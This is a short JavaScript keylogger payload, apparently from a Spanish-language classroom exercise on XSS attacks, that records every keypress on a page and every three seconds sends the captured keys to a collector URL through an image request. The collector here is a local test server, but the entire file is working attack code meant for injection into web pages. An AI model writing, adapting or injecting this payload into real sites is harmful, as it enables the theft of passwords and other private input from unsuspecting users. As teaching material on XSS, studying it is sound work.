var keys = '';
document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function(){
    new Image().src = 'http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/SVTeclas?t=' + keys;
    keys = '';
}, 3000);


